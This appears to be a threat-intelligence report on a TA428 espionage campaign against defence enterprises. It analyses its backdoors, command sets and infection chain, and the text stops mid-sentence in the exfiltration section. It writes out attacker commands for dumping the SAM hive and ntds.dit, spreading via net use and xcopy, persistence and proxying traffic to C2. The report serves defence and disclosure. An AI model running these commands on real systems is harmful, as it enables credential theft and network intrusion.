{
    "id": "a71bea35-2dae-4474-bbb2-1bb7d83001dc",
    "created_at": "2022-10-25T16:48:18.859294Z",
    "updated_at": "2025-03-27T02:13:25.092352Z",
    "deleted_at": null,
    "sha1_hash": "2459c48c35a96c3e40cbc5c6a98e1db9eb41e562",
    "title": "Targeted attack on industrial enterprises and public institutions",
    "authors": "",
    "file_creation_date": "2022-08-05T16:07:54Z",
    "file_modification_date": "2022-08-05T16:07:54Z",
    "file_size": 1481931,
    "plain_text": "# Targeted attack on industrial enterprises and public institutions\n\n\n-----\n\nExecutive summary ......................................................................................................................................................................................... 2\n\nTechnical details ................................................................................................................................................................................................ 3\n\nInitial infection ................................................................................................................................................................................................. 3\n\nMalware implants .......................................................................................................................................................................................... 5\n\nPortDoor ......................................................................................................................................................................................................... 5\n\nnccTrojan ....................................................................................................................................................................................................... 9\n\nCotx and DNSep ...................................................................................................................................................................................... 12\n\nLogtu ............................................................................................................................................................................................................... 14\n\nCotSam .......................................................................................................................................................................................................... 16\n\nLateral movement ....................................................................................................................................................................................... 18\n\nCollecting information on the enterprise’s infrastructure ........................................................................................ 18\n\nMalware distribution .............................................................................................................................................................................. 19\n\nDomain hijacking ..................................................................................................................................................................................... 20\n\nInfrastructure and data exfiltration .............................................................................................................................................. 22\n\nVictims ................................................................................................................................................................................................................... 23\n\nAbout the attackers .................................................................................................................................................................................... 24\n\nConclusions ....................................................................................................................................................................................................... 25\n\nRecommendations ........................................................................................................................................................................................ 26\n\nAppendix I – indicators of compromise ........................................................................................................................................ 28\n\n##### In January 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks on military industrial complex enterprises and public institutions in several Eastern European countries and Afghanistan. In the course of our research, we were able to identify over a dozen of attacked organizations. \n\n The attackers were able to penetrate dozens of enterprises and even hijack the IT infrastructure of some, taking control of systems used to manage security solutions.\n\n An analysis of information obtained during our investigation indicates that cyberespionage was the goal of this series of attacks.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 1\n\n\n-----\n\n## Executive summary\n\nThe attackers penetrate the enterprise network using carefully crafted phishing\nemails, some of which contain information that is specific to the organization\nunder attackand is not publicly available. This could indicate that the attackers\ndid preparatory work in advance (they may have obtained the information in\nearlier attacks on the same organization or its employees or on other\norganizations or individuals associated with the victim organization).\n\nMicrosoft Word documents attached to the phishing emails contain malicious\n[code that exploits the CVE-2017-11882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882) vulnerability. The vulnerability enables an\nattacker to execute arbitrary code (in the attacks analyzed, the main module of\nthe PortDoor malware) without any additional user activity.\n\nAn earlier series of attacks in which the PortDoor malware was also used was\n[described by Cybereason experts.](https://www.cybereason.com/blog/portdoor-new-chinese-apt-backdoor-attack-targets-russian-defense-sector)\n\nIn the new series of attacks, the attackers used six different backdoors at the\nsame time – probably to set up redundant communication channels with\ninfected systems in case one of the malicious programs was detected and\nremoved by a security solution. The backdoors used provide extensive\nfunctionality for controlling infected systems and collecting confidential data.\n\nThe Ladon hacking utility is used as the main lateral movement tool. It combines\nnetwork scanning, vulnerability search and exploitation, password attack, and\nother functionality. The attackers also extensively use standard utilities that are\npart of the Microsoft Windows operating system.\n\nThe attack’s final stage involves hijacking the domain controller and gaining\ncomplete control of all of the organization’s workstations and servers. After\ngaining domain administrator privileges, the attackers search for and exfiltrate\ndocuments and other files that contain the attacked organization’s sensitive\ndata to their servers hosted in different countries. These servers are also used\nas CnC servers.\n\nThe attackers compressed stolen files into encrypted and password-protected\nZIP archives. After receiving the data collected, the CnC servers forwarded the\narchives received to a stage two server located in China.\n\nThe attackers used DLL hijacking and process hollowing techniques extensively\nin the attack to prevent security software from detecting the malware.\n\nOur analysis of information obtained during the investigation suggests that it is\nhighly probable that a Chinese-speaking group is behind the attacks.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 2\n\n\n-----\n\nOur researchers identified malware and CnC servers that have earlier been used\nin attacks attributed by other researchers to TA428, a Chinese-speaking APT\ngroup.\n\nWe believe that the series of attacks that we have identified is highly likely to be\n[an extension of a known campaign described in Cybereason, DrWeb,](https://www.cybereason.com/blog/portdoor-new-chinese-apt-backdoor-attack-targets-russian-defense-sector) and\n[NTTSecurity research and has been attributed with a high degree of confidence](https://insight-jp.nttsecurity.com/post/102gr6l/ta428ncctrojan)\nto APT TA428 activity.\n\n[The full article is available on Kaspersky Threat Intelligence.](https://www.kaspersky.com/enterprise-security/threat-intelligence)\n\n[For more information please contact: ics-cert@kaspersky.com.](mailto:ics-cert@kaspersky.com)\n\n## Technical details\n\n### Initial infection\n\nIn January 2022, Kaspersky ICS CERT experts uncovered a new wave of\ntargeted attacks on military-industrial complex enterprises and public\ninstitutions in several countries of Eastern Europe and Afghanistan.\n\nThe attackers penetrated the enterprise network using carefully crafted\nphishing emails. In the course of our investigation, we discovered that, in some\ncases, the attackers create phishing emails using information that is not publicly\navailable, such as the full names of employees responsible for handling sensitive\ninformation, as well as internal codenames of projects developed by attacked\norganizations.\n\nPhishing emails contain Microsoft Word documents with embedded malicious\ncode that exploits the [CVE-2017-11882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882) vulnerability. The text in such documents\nis crafted using specific details on the organization’s operation, some of which\nmay not be publicly available.\n\nAn analysis of document metadata has shown that, with a high degree of\nlikelihood, the attackers stole the document (while it was still legitimate) from\nanother military industrial complex enterprise, after which they modified it using\na weaponizer, a program designed to inject malicious code into documents.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 3\n\n\n-----\n\nFragment\nof malicious\ndocument\ncontents\n\n\nEquation object\nembedded in\nthe document\n(underlined)\n\n\nThe document provides rationale for research and development work related to\ndeveloping a new product that is to be conducted by the attacked enterprise as\nthe primary contractor.\n\nThe CVE-2017-11882 vulnerability exists in outdated versions of the Microsoft\nEquation Editor (a Microsoft Office component). It enables an attacker to use a\nspecially crafted byte sequence masked as an equation, which, when processed,\nwill result in arbitrary code being executed on behalf of the user.\n\nHowever, a malicious document can still be visually detected by noticing an\nunusual equation object:\n\nThe vulnerability enables the malware to gain control of an infected system\nwithout any additional user activity. For example, there is no need for the user to\nenable macros, which is required by most attacks.\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 4\n\n\n-----\n\nThe malicious code embedded in the document drops PortDoor malware.\n[According to the Cybereason](https://www.cybereason.com/blog/portdoor-new-chinese-apt-backdoor-attack-targets-russian-defense-sector) blog post, the malware has earlier been used by\nthe TA428 APT.\n\nThe PortDoor executable is first extracted to the %AppData%\\Local\\Temp\ndirectory with the name 8.t, after which it is moved to the Microsoft Word\nstartup directory, %AppData%\\Roaming\\Microsoft\\Word\\STARTUP, with a\nname that is specific to each attack, such as strsrv.wll. The malware is installed\nas a Microsoft Word add-in, enabling the attackers to get a foothold and gain\nremote control of the infected system.\n\nAfter launching, the malware collects general information about the infected\nsystem, such as computer name, IP addresses, etc., and sends the information\ncollected to the CnC server. In cases where profiling results show that the\nsystem is of interest to the attackers, they use the backdoor functionality in\nPortDoor to control the system remotely and deploy additional malware.\n\nInitial infection of a system\n\n### Malware implants\n\nThe attackers deploy several backdoors at the same time on those systems that\nare of interest to them. In all likelihood, they use the tactic to create redundant\nchannels of communication with an infected system, e.g., in case one of the\nmalicious programs is removed by a security solution.\n\n#### PortDoor\n\n[Although the functionality of PortDoor was described in the Cybereason](https://www.cybereason.com/blog/portdoor-new-chinese-apt-backdoor-attack-targets-russian-defense-sector) blog\npost, we present the findings of our research to show in what ways the new\nversion of the malware is different from the older version.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 5\n\n\n-----\n\nConfiguration\ninformation\nof the malware\n\n\nAfter launching, the malware decrypts the part of its executable file that\ncontains configuration information:\n\n**Value** **Description**\n\n**45.63.27.162** Malware CnC server address\n\n**443 (0x01BB)** Port on which connections with the\nCnC server are established\n\n**Kr*^j4** Checksum used to activate payload\nexecution\n\n**A1-45** Victim ID sent by the malware to the\nCnC server\n\n**78936077.tmp** File for storing the malware\ninstallation ID\n\n**0987654321fedcba** AES key used to encrypt data sent\nbetween the malware and the CnC\nserver\n\nTable 1. Descriptions of malware configuration information fields\n\nAfter decrypting the configuration information, the malware checks that it is not\nrunning in a debugger. It also checks whether a file with the name specified in the\nconfiguration information, such as 78936077.tmp, exists in the temporary file\ndirectory.\n\nIf the file does not exist, it is created by the malware and a value equal to the\nproduct of a pseudorandom number and the time that has passed since system\nstartup is written to it. If the file exists, the malware reads the value written to it\nearlier.\n\nPortDoor uses the above algorithm to create a unique infected system ID, which\nis sent to the attackers every time PortDoor connects to the CnC server. The ID\n\n|Value|Description|\n|---|---|\n|45.63.27.162|Malware CnC server address|\n|443 (0x01BB)|Port on which connections with the CnC server are established|\n|Kr*^j4|Checksum used to activate payload execution|\n|A1-45|Victim ID sent by the malware to the CnC server|\n|78936077.tmp|File for storing the malware installation ID|\n|0987654321fedcba|AES key used to encrypt data sent between the malware and the CnC server|\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 6\n\n\n-----\n\nFragment\nof code\ngenerating\nan array\nwith imported\nfunction names\n\n\nis needed because infected systems in the same organization can have the same\nvictim ID and external IP address (because they are behind NAT).\n\nNext, the malware establishes a connection with a CnC server using the address\nand port specified in the configuration information. Data sent to the CnC server,\nas well as data received in response, is encrypted using AES with a key that is\nalso taken from the configuration information.\n\nAfter receiving a response from the CnC server, the malware checks that it\ncontains a special string. In the malware sample discussed here, the string has\nthe value “Kr*^j4”. The malware starts dynamically importing Windows API\nfunctions by hashes and subsequently executing the payload only if the strings\nmatch. It cannot be said for certain why the attackers implemented this logic in\nPortDoor. One possible answer is that this may be a way to check the\ncompatibility of the Trojan’s versions with the CnC server.\n\nAs mentioned above, PortDoor dynamically imports Windows API functions by\nhashes. The technique eliminates the need for the threat actor to include strings\nwith the names of imported functions in its code to reduce the chances of the\nmalware being detected. The malware first loads the necessary libraries into\nmemory, after which PortDoor reads a loaded library’s export table and\ncalculates the checksum of each exported function’s name until it finds a match\nwith a hash value hard-coded into the malware:\n\nWhen it has completed searching for and importing the necessary functions, the\nmalware enters a loop, waiting for commands from its CnC server.\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 7\n\n\n-----\n\nThe PortDoor version identified in the new series of attacks supports the\nfollowing functions:\n\n**Command** **Description**\n\n**code**\n\n**1** Check whether control value “Kr*^j4” is present and send the\nrelevant response to CnC server (probably a version check)\n\n**8** Collect information on the infected system: Windows ANSI\ncode page, original equipment manufacturer (OEM) code\npage, user name, computer name, operating system version,\nCPU information and victim identifier (e.g., A1-45)\n\n**12** Write the data sent to the file specified, adding the string\n“exit\\n” at the end of the file (used by the attackers to\ncreate CMD and PowerShell scripts remotely)\n\n**16** Hidden remote shell (launches cmd.exe with the\nCREATE_NO_WINDOW attribute), sends the output to the\nCnC server\n\n**17** Write the data sent to the file specified, adding line feed (\\n)\nat the end of the file\n\n**40** Append the data sent to the end of the file specified\n\n**41** Write the data sent to a previously opened file\n\n**42** Close a previously opened file\n\n**43** Read the file specified\n\n**45** Close a file opened earlier\n\n**48** Collect information on processes running in the system\n\n**49** Terminate the process specified\n\n**65** Collect information on the media (hard drives and USB\ndevices) connected to the system: media type, device\ncharacteristics, and free space\n\n**66** List files by mask in the directory specified\n\n**67** Remove the file specified\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 8\n\n|Command code|Description|\n|---|---|\n|1|Check whether control value “Kr*^j4” is present and send the relevant response to CnC server (probably a version check)|\n|8|Collect information on the infected system: Windows ANSI code page, original equipment manufacturer (OEM) code page, user name, computer name, operating system version, CPU information and victim identifier (e.g., A1-45)|\n|12|Write the data sent to the file specified, adding the string “exit\\n” at the end of the file (used by the attackers to create CMD and PowerShell scripts remotely)|\n|16|Hidden remote shell (launches cmd.exe with the CREATE_NO_WINDOW attribute), sends the output to the CnC server|\n|17|Write the data sent to the file specified, adding line feed (\\n) at the end of the file|\n|40|Append the data sent to the end of the file specified|\n|41|Write the data sent to a previously opened file|\n|42|Close a previously opened file|\n|43|Read the file specified|\n|45|Close a file opened earlier|\n|48|Collect information on processes running in the system|\n|49|Terminate the process specified|\n|65|Collect information on the media (hard drives and USB devices) connected to the system: media type, device characteristics, and free space|\n|66|List files by mask in the directory specified|\n|67|Remove the file specified|\n\n\n-----\n\n|68|Move the file specified|\n|---|---|\n|69|Launch the process specified in hidden mode (launch with the CREATE_NO_WINDOW attribute)|\n\n\n#### nccTrojan\n\n\nTable 2. List of commands supported by PortDoor\n\nIn the course of our investigation, we also identified the nccTrojan malware on\n[many infected systems. The malware has earlier been used in attacks attributed](https://insight-jp.nttsecurity.com/post/102gr6l/ta428ncctrojan)\nby NTTSecurity experts to the TA428 APT group. In the series of attacks\ndescribed by the researchers, the attackers used the first version of nccTrojan,\nas well as versions 2 and 2.1. In January 2022, we identified a new, improved\nversion of nccTrojan – 2.45, as evidenced by the path to the .pdb file and the\nconfiguration information of the malware.\n\nThe installation of nccTrojan is performed by downloading files from the\nPortDoor CnC server. The executable file (DLL library) of nccTrojan is\ndownloaded as a .cab archive with an arbitrary name, e.g., wam.dll.cab. To unpack\nit, the attackers use the expand system utility. The file is unpacked into an\nexisting directory used by legitimate software, e.g.,\n%ProgramData%\\Intel\\ShaderCache, %Program Files%\\Common\nFiles\\AV\\Norton Security Ultra, %ProgramData%\\2GIS,\n%ProgramData%\\Adobe, etc.\n\nThe attackers also download a special installer component to the infected\nsystem. It registers the DLL of nccTrojan as a service, ensuring that the malware\nis loaded automatically at system startup. Curiously, nccTrojan version 2.45 is\nbundled with an installer that is apparently inherited from a previous version\n(2.43), as evidenced by the path to the .pdb file.\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 9\n\n\n-----\n\nAlgorithm\nof nccTrojan\ninstaller\n\n\nInstallation of nccTrojan malware\n\nAfter launching, the main nccTrojan module connects to CnC servers and waits\nfor a command that should be executed. The malware attempts to connect to all\nCnC servers hard-coded into the executable file. All subsequent communication\nis carried out with the server that was the first to respond.\n\nWhen connecting to the CnC server, the malware sends general information\nabout the infected system to the attackers, including computer name, user\nname, local IP address, system localization information, malware version, etc. ‘\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 10\n\n\n-----\n\nArray with data on an infected system collected by nccTrojan\n\nLike PortDoor, nccTrojan has backdoor functionality. Thus, the attackers get\ntwo channels for controlling the infected system at the same time. In addition,\nnccTrojan has functionality that uploads information collected by the attackers\nto the CnC server. Among other things, it is used to steal files containing\nconfidential information. A complete list of commands supported by nccTrojan\nversion 2.45 is provided below:\n\n**Command** **Description**\n\n**code**\n\n**0, 1, 2** Launch command line (Unicode encoding) and send\noperating system version to CnC server\n\n**3** Execute command in command line (Unicode encoding)\n\n**4** Execute command in command line (ASCII encoding)\n\n**5** Collect information about connected media (hard-drives\nand USB devices)\n\n**6** Send a list of files in the directory specified\n\n**8** Launch the executable file specified\n\n**10** Remove the file or folder specified\n\n**12** Upload selected files from the infected system to the CnC\nserver\n\n**15, 17** Download files to infected system from the CnC server\n\n**19** Send a list of processes running on the system\n\n**21** Kill process\n\n**23** Copy specified file\n\n**26** Move specified file\n\n**29** Launch remote command line (ASCII encoding)\n\nTable 3. List of commands supported by nccTrojan\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 11\n\n|Command code|Description|\n|---|---|\n|0, 1, 2|Launch command line (Unicode encoding) and send operating system version to CnC server|\n|3|Execute command in command line (Unicode encoding)|\n|4|Execute command in command line (ASCII encoding)|\n|5|Collect information about connected media (hard-drives and USB devices)|\n|6|Send a list of files in the directory specified|\n|8|Launch the executable file specified|\n|10|Remove the file or folder specified|\n|12|Upload selected files from the infected system to the CnC server|\n|15, 17|Download files to infected system from the CnC server|\n|19|Send a list of processes running on the system|\n|21|Kill process|\n|23|Copy specified file|\n|26|Move specified file|\n|29|Launch remote command line (ASCII encoding)|\n\n\n-----\n\n#### Cotx and DNSep\n\nSimilarly to nccTrojan, the attackers download backdoors known as Cotx and\nDNSep in .cab archives to computers being infected at the lateral movement\n[stage. The malware was described in a Dr.Web research paper, so here we only](https://news.drweb.ru/show/?i=14177)\nprovide a few clarifications and updates relevant to the series of attacks that\nwe are describing.\n\nThe two malicious programs have identical functionality and differ only in some\nparts of the code.\n\nAfter delivering and unpacking Cotx/DNSep, the attackers use the DLL hijacking\ntechnique in outdated and vulnerable versions of McAfee SecurityCenter, the\nSophos SafeStore Restore tool, and Intel Common User Interface. The malicious\nlibrary that is loaded and executed using the DLL hijacking technique decrypts\nthe backdoor’s executable file, which is located in a file with the extension .log.\n\nCotx executable files are encrypted using the AES256 algorithm. They are\ndecrypted using a key hard-coded into the malicious library:\n\n\nFragment\nof Cotx\ndecryption\ncode\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 12\n\n\n-----\n\nDNSep executable files are unpacked using the RtlDecompressBuffer function.\n\nAfter being decrypted, the backdoor is loaded into a legitimate process’s\nmemory using the process hollowing technique and connects to the CnC server.\nIn the case of Cotx, malicious code is injected into the dllhost.exe process and in\nthe case of DNSep, it is injected into the process of powercfg.exe, a power\nmanagement utility.\n\nA list of commands supported by the Cotx and DNSep backdoors is provided\nbelow:\n\n**Command** **Description**\n\n**code**\n\n**1** Set bot ID\n\n**2** Launch command line\n\n**3** Execute command in previously launched command line\n\n**4** Collect information on connected data media (hard-drives\nand USB devices)\n\n**6** Upload file from infected system to CnC server\n\n**7** Copy file\n\n**8** Remove file\n\n**9** Get file size\n\n**10** Move file\n\n**11** Set time interval for requests to CnC server\n\n**13** Remove malware\n\nTable 4. List of commands supported by Cotx and DNSep\n\nThe variant of Cotx that we have identified is very similar to the variant analyzed\nearlier by Dr.Web and is most likely to be its updated version.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 13\n\n|Command code|Description|\n|---|---|\n|1|Set bot ID|\n|2|Launch command line|\n|3|Execute command in previously launched command line|\n|4|Collect information on connected data media (hard-drives and USB devices)|\n|6|Upload file from infected system to CnC server|\n|7|Copy file|\n|8|Remove file|\n|9|Get file size|\n|10|Move file|\n|11|Set time interval for requests to CnC server|\n|13|Remove malware|\n\n\n-----\n\n#### Logtu\n\n\nComparison of Cotx self-removal function from the new attack series (left)\n\nand the sample analyzed by Dr.Web (right)\n\nThe Logtu malware has also been [observed](https://news.drweb.ru/show/?i=14177) in attacks attributed to TA428. The\nnew version of Logtu uses dynamic imports and XOR encrypted function names\nto evade detection:\n\n\nDecrypting\nand getting\nthe address\nof the\nGetTickCount\nfunction\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 14\n\n\n-----\n\nLogtu is downloaded, deployed and launched in the same way as Cotx and\nDNSep, with the following exception: instead of using the process hollowing\ntechnique with a system process, it is used with a legitimate software process\ninto which a malicious library has been loaded.\n\nA list of commands supported by Logtu is shown below:\n\n**Command** **Description**\n\n**code**\n\n**1** Send time since system startup (calculated using\nGetTickCount function)\n\n**2** Launch command-line interpreter, redirecting input and\noutput to named pipe\n\n**3** Write data to the file specified\n\n**4** Remove the file specified\n\n**5** The command accepts an argument divided into two parts\nwith the | character, e.g., <a>|<b>. The command checks\nwhether file <a> exists – if the file exists, <b>|<file size> is sent\nto the server; if the file does not exist –<b>|01 is sent to the\nserver, after which the file <a>.tut is created and the\ncharacter “0” is written to it 32 times\n\n**6** Augment the file specified (e.g., <a>) with data received from\nthe malware CnC server. If the relevant parameter is\nspecified, the malware removes the file <a> and renames the\nfile <a>.tu to <a>.\n\n**7** Send file creation date and time for the file specified\n\n**8** Read 4kb from the file specified at the offset specified and\nsend to the CnC server\n\n**9** Collect information on file systems used on the infected\nmachine\n\n**10** Send dirlist for the directory specified (list of files with sizes,\ntime modified, and file attributes)\n\n**11** Remove the file specified\n\n**12** Move the file specified\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 15\n\n|Command code|Description|\n|---|---|\n|1|Send time since system startup (calculated using GetTickCount function)|\n|2|Launch command-line interpreter, redirecting input and output to named pipe|\n|3|Write data to the file specified|\n|4|Remove the file specified|\n|5|The command accepts an argument divided into two parts with the | character, e.g., <a>|<b>. The command checks whether file <a> exists – if the file exists, <b>|<file size> is sent to the server; if the file does not exist –<b>|01 is sent to the server, after which the file <a>.tut is created and the character “0” is written to it 32 times|\n|6|Augment the file specified (e.g., <a>) with data received from the malware CnC server. If the relevant parameter is specified, the malware removes the file <a> and renames the file <a>.tu to <a>.|\n|7|Send file creation date and time for the file specified|\n|8|Read 4kb from the file specified at the offset specified and send to the CnC server|\n|9|Collect information on file systems used on the infected machine|\n|10|Send dirlist for the directory specified (list of files with sizes, time modified, and file attributes)|\n|11|Remove the file specified|\n|12|Move the file specified|\n\n\n-----\n\n|13|Launch program (create process)|\n|---|---|\n|14|Make screenshot|\n|15|Send a list of services registered in the system (service name, status, and display name)|\n|16|Launch the service specified|\n|17|Send a list of running processes|\n|18|Terminate the process specified|\n|19|Close the connection with the CnC server|\n\n\n#### CotSam\n\n\nDecrypting\nthe CotSam\nmalware module\n\n\nTable 5. List of commands supported by Logtu\n\nIn addition to all the malware described above, in the course of our research we\ncame across a new backdoor that is different from all others used in attacks\nattributed by researchers to TA428. Due to its similarity with the Cotx backdoor,\nwe decided to name the malware Backdoor.Win32.CotSam.\n\nIn the process of developing the attack, the attackers have used two methods\nof deploying the malware at the same time.\n\nIn the first case, the attackers delivered a vulnerable version of Microsoft Word\ntogether with the malware. Microsoft Word 2007 was used for 32-bit systems\nand Microsoft Word 2010 for 64-bit systems. DLL hijacking vulnerability was\nexploited after loading WINWORD.EXE, resulting in control being passed to the\nmalicious library named wwlib.dll, which decrypts the file OEMPRINT.CAT from\nthe current directory by performing a simple xor operation with the key 0xAA:\n\nNext, the WriteProcessMemory function is used to write the decrypted\nexecutable file directly to the memory of the svchost.exe process.\n\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 16\n\n\n-----\n\nIn the second case, the attackers exploited DLL hijacking vulnerability in the\napplaunch.exe application (MD5: 170D73BE3FE846E9070CFAE530F5A31C). It is\n[worth noting that the same version of applaunch.exe had previously been used](https://www.secureworks.com/research/shadowpad-malware-analysis)\nby other Chinese groups to distribute ShadowPad malware.\n\nAfter launching, the backdoor extracts the proxy server’s parameters from the\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ProxyServer registry key and connects to the CnC server, waiting for\ncommands.\n\n**Command** **Description**\n\n**code**\n\n**0x268447744** Get information on the infected system’s architecture using\nthe GetNativeSystemInfo function\n\n**0x268443648** Collect information on data media connected (hard-drives\nand USB devices)\n\n**0x268443649** Get a list of files in the directory specified\n\n**0x268443650** Read the file specified\n\n**0x268443651** Set the specified event object to the signaled state\n\n**0x268443654** Create a file at the path specified\n\n**0x268443655,** Write the data received from CnC to the file specified\n**0x268451842**\n\n**0x268443656** Remove the file specified\n\n**0x268443657** Launch the file specified (create process)\n\n**0x268443658** Check whether a file or a directory exists\n\n**0x268464128** Send a data buffer to the malware CnC server, with data\nencrypted using XOR with the key 48\n\n**0x268447745** Terminate the process specified\n\n**0x268472320** Launch the command line interpreter\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 17\n\n|Command code|Description|\n|---|---|\n|0x268447744|Get information on the infected system’s architecture using the GetNativeSystemInfo function|\n|0x268443648|Collect information on data media connected (hard-drives and USB devices)|\n|0x268443649|Get a list of files in the directory specified|\n|0x268443650|Read the file specified|\n|0x268443651|Set the specified event object to the signaled state|\n|0x268443654|Create a file at the path specified|\n|0x268443655, 0x268451842|Write the data received from CnC to the file specified|\n|0x268443656|Remove the file specified|\n|0x268443657|Launch the file specified (create process)|\n|0x268443658|Check whether a file or a directory exists|\n|0x268464128|Send a data buffer to the malware CnC server, with data encrypted using XOR with the key 48|\n|0x268447745|Terminate the process specified|\n|0x268472320|Launch the command line interpreter|\n\n\n-----\n\n|0x268472324|Set high integrity control for the process (S-1-16-12288)|\n|---|---|\n|0x268464129|Write the data received from CnC to the setting.cfg configuration file|\n\n\nTable 6. List of commands supported by CotSam\n\n### Lateral movement\n\nAfter gaining a foothold on the initial system, the attackers attempt to spread\nthe malware to other computers on the enterprise network. At this stage, the\nattackers’ goal is to gain access to the domain controller and take full control of\nthe attacked organization’s infrastructure.\n\nTo launch their utilities and get the results of their operation, the attackers use a\nremote shell provided by backdoor malware. In the course of our research, we\nidentified a series of commands executed on infected systems that the\nattackers entered by hand (this is indicated both by the time intervals between\ncommands and by the output of results not being redirected anywhere except\nstandard output).\n\n#### Collecting information on the enterprise’s infrastructure\n\nThe attackers mostly scanned the network using the NBTscan console utility,\nwhich was delivered to victim computers as a .cab archive named ace.cab and\nunpacked using the expand system utility:\n```\nexpand.exe ace.cab ace.exe\nace -n 172.22.0.0/16\n\n```\nIn some cases, we also saw that the Ladon hacking framework had been used.\nThe framework consists of numerous modules with diverse lateral movement\nfunctionality, including:\n\n          - Scanning the network and finding different types of devices.\n\n          - Identifying and exploiting vulnerabilities in the devices found.\n\n          - Cracking passwords for resources on the network.\n\n          - Searching for password hashes.\n\n          - Searching for passwords in text files.\n\n          - Remotely executing arbitrary code.\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 18\n\n\n-----\n\nFragment\nof Ladon code\n\n\nThese tools enable an attacker to scan the entire infrastructure that is available\nover the network and identify the most vulnerable computers on the network.\n\nThe attackers also collected information on users working on the system and\ntheir network connections. Specifically, they were interested in RDP\nconnections:\n```\nquery user\nnet user\nnet group\nipconfig /all\nnetstat -no\nnetstat -no | findstr 3389\nnetstat -ano | findstr 2589\n\n#### Malware distribution\n\n```\nThe attackers were able to move laterally by infecting one system after another,\ngaining access to these systems using network scanning results and user\ncredentials stolen earlier. They used the net use and xcopy utilities to establish\nnetwork connections with remote systems and copy malware to those systems:\n```\nnet use \\\\[IP address]\\IPC$ \"[password]\" /u:\"[user name]\"\nxcopy.exe /s \\\\[IP address]\\c$\\windows\\web\\*\" $windir\\Web\\ /y /e /i /q\n\n```\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 19\n\n\n-----\n\nIn some cases, malware was launched using an open-source VBS script named\nwmic.vbs, which the attackers also downloaded to remote systems:\n```\ncscript.exe //nologo wmic.vbs /cmd [IP address] [user name][password]\n$appdata\\ABBYY\\Install.exe\n\n```\nThe VBS script was originally developed as a penetration testing tool, but threat\nactors often use it in real-world attacks. The script, wmic.vbs, executes\ncommands on behalf of a user account with administrative privileges using\nWMIC (Windows Management Instrumentation Command-line).\n\nIn other cases, the attackers created a task in Windows Task Scheduler to\nensure that the malware started automatically:\n```\nschtasks /create /tn CacheTasks /tr “$appdata\\ABBYY\\FineReader\\WINWORD.EXE” /sc\nminute /mo 50 /ru “” /f\n\n```\nIn cases where the attackers were able to reach closed networks (i.e., networks\nthat are not directly connected to the internet), they turned intermediate\nsystems (systems available from closed networks and at the same time\nconnected to the internet) into proxy servers. This enabled malware running on\nsystems that were part of closed networks to communicate with its CnC\nservers. Setting up network traffic redirection in this case was a trivial task that\nwas also performed using standard Windows tools:\n```\nnetsh interface portproxy add v4tov4 2589 <IP address> 443\n\n#### Domain hijacking\n\n```\nAfter gaining access to the domain controller, the attackers stole the entire\ndatabase of Active Directory user password hashes. To do this, they first saved\na copy of system registry hives with a special cmd command:\n```\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SECURITY security.save\n\n```\nNext, they copied the file ntds.dit, which contains the Active Directory database,\nincluding user password hashes. Curiously, the file ntds.dit is continuously used\nby the system and cannot be copied using standard tools. To get around this\nrestriction, the attackers used a special utility designed to copy the file using the\nWindows volume shadow copy service (VSS).\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 20\n\n\n-----\n\nUtility designed\nto copy files\nusing VSS\n\n\nAn example of a command launching the utility is shown below:\n```\nc:\\programdata\\microsoft\\sc64.exe c:\\windows\\ntds\\ntds.dit\nc:\\programdata\\microsoft\\ntds.dit\n\n```\nUsing the contents of the system registry and the file ntds.dit, the attackers\nwere able to get logins and password hashes for all users of the domain. Next,\nthe attackers used hash cracking to gain authentication credentials for most\nusers from the attacked organization’s domain.\n\nIn cases where an attacked organization’s IT infrastructure includes several\ndomains, the attackers analyzed trust relationships between the domains to\nidentify accounts allowing them to move laterally:\n```\nnltest /domain_trusts\n\n```\nIn the process of attacking a domain controller, the attackers obtained, among\nothers, the password hash of the user krbtgt (Active Directory service account),\nenabling them to conduct an attack known as Golden Ticket. It allowed them to\nissue Kerberos tickets (TGT) independently and authenticate on any Active\nDirectory service – all of this for an unlimited time.\n\nIn one of the cases analyzed, the attacked organization’s security team was able\nto identify suspicious activity on the domain controller, after which the\npasswords of those users whose accounts had been compromised were\n\nTARGETED ATTACK ON INDUSTRIAL ENTERPRISES 21\n\n\n-----\n\nchanged. However, the attackers continued to act on behalf of these accounts\nwithout any problems using Kerberos tickets. This shows that in the case of a\nGolden Ticket attack, standard incident response methods are inadequate.\n\nFinally, it is worth noting that in one of the cases the attackers were also able to\ngain access to the server hosting the system that controls security solutions\nand to remotely modify the settings of endpoint security solutions used by the\norganization.\n\n### Infrastructure and data exfiltration\n\nAs part of a joint research project, we were granted access to the contents of\nseveral CnC servers hosted in the infrastructure of a hosting service provider.\nThis provided us with additional threat actor activity information.\n\nAfter gaining control of a major part of the attacked organization’s IT\ninfrastructure, the attackers moved on to the stage of stealing sensitive\ninformation. All files collected by the attackers were packed into passwordprotected ZIP archives. To automate the process, the attackers used their own\nbuild of the 7-Zip utility.\n\n\nCode fragment\nfrom the 7-Zip\nbuild used\nin the attack\n\n\nIt is worth emphasizing that the attackers created their archives in such a way\nthat the names of the files in the archive, as well as their contents, were\nencrypted. In some cases, this approach may enable them to evade DLP\nsolutions when sending sensitive data beyond the organization’s perimeter.\n\nThe archives created 